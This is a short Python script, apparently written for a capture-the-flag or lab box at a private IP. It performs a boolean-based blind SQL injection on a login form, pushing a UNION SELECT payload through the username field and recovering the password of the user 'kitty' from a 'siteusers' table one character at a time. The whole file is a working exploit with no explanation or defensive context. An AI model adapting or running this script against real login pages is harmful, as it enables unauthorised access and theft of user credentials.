import string
import requests
import sys
import time

url = "http://10.10.39.28/index.php"

dbs = ["mywebsite"]

alphabet = string.ascii_letters + string.digits + "-_"

for db in dbs:
    print(f"{db}:")
    result = ""

    i = 0
    while i < len(alphabet):
        char = alphabet[i] if alphabet[i] != '_' else '\_'
        data = {
            "username": f"' UNION SELECT 1,2,3,4 FROM siteusers WHERE username = 'kitty' AND password LIKE BINARY '{result}{char}%'-- -",
            "password": "qsdqsdqsdqsdqsd"
        }
        r = requests.post(url, data=data)
    
        if "Welcome to our site" in r.text:
            result += alphabet[i]
            i = 0
        else:
            print(f"\r{result}{alphabet[i]}", end="", flush=True)
            i += 1
            
    print(f"\r{result} ")
            
